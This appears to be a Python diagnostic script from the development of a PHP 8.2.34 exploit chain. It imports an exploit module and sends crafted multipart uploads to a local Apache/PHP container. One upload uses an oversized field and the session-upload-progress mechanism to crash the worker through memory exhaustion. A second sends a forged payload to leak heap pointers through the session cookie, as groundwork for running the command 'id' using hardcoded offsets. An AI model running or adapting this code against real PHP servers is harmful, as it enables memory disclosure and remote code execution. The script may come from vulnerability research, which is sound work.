"""8.2.34 stage-1 diagnostic: does the 12MB 'big' field actually OOM the worker?
If a per-field limit (like 7.4.33's ~1.9MB) drops it, no OOM -> no leak.

Test matrix of 'big' field sizes; after each, check:
  - response size / fatal error (OOM signature)
  - worker PID change (refork = worker died)
  - leak-request cookie length (the actual stage-1 signal)
"""
import sys, os, time, struct, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18111/"
C = "p2s8234"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def worker_pids():
    r = sh(f'docker exec {C} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    return [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]

def cookie_summary(resp):
    raw = E.parse_cookie(resp)
    if len(raw) < 16:
        return len(raw), []
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    return len(raw), c.most_common(3)

def trial(mb, n=841):
    t = E.Target(URL, timeout=90.0, verbose=False)
    ex = E.Exploit(t, "id", zif_offset=0x39b8a0, dtor_offset=0x487650,
                   htdata_offset=0x690d8, huge_mb=12, verbose=False, profile="bookworm")
    pids_before = worker_pids()
    # OOM trigger
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": "pwn".encode()},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (mb * 1024 * 1024)},
    ]
    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
    except Exception as e:
        r1 = b""
    time.sleep(0.4)
    pids_after = worker_pids()
    refork = pids_after != pids_before
    # leak request
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=90.0)
    except Exception as e:
        r2 = b""
    clen, top = cookie_summary(r2)
    fatal = (b"Fatal" in r1) or (b"Allowed" in r1) or (b"memory" in r1.lower())
    print(f"big={mb}MB: resp1={len(r1)}B refork={refork} fatal={fatal} | "
          f"leak cookie={clen}B top={[(hex(k),v) for k,v in top]}", flush=True)
    return clen

print("=== 8.2.34: does 'big' field OOM the worker? ===", flush=True)
for mb in [4, 8, 12, 16, 20, 24]:
    trial(mb)
    time.sleep(0.5)
print("=== done ===", flush=True)
